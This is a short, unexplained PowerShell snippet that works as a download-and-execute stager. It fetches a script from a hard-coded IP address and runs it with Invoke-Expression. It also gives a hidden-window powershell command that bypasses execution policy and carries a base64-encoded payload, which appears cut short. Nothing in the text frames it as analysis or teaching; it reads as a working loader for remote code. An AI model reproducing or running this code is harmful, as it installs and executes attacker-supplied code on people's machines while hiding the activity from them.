$s = New-Object Net.WebClient;
$u = 'http://185.220.101.7/a/update'
$d = $s.DownloadString($u)
Invoke-Expression $d
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA
